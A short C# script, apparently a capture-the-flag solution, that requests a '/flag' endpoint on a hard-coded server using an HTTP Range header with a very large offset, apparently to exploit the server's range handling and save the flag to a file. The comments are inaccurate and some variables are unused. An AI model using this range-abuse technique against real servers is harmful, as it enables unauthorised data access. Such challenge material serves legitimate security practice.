using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.IO; 

namespace Scripts
{
    class getPartOfFile
    {
        public void work()
        {
            var r = GetWebPageContent("http://164.132.103.207:8000/flag");
            File.WriteAllText("SERCRET.txt", r);
            Console.WriteLine(r);
        }
        string GetWebPageContent(string url)
        {
             
            string result = string.Empty;
            HttpWebRequest request;
            const int bytesToGet = 1000;
            request = WebRequest.Create(url) as HttpWebRequest;

            //get first 1000 bytes
            request.AddRange(8589934634 - 1000, 8589934640);
             WebClient Client = new WebClient(); 
           

            // the following code is alternative, you may implement the function after your needs
            using (WebResponse response = request.GetResponse())
            {
                using (StreamReader sr = new StreamReader(response.GetResponseStream()))
                {
                    result = sr.ReadToEnd();
                }
            }
            return result;
        }
    }
}
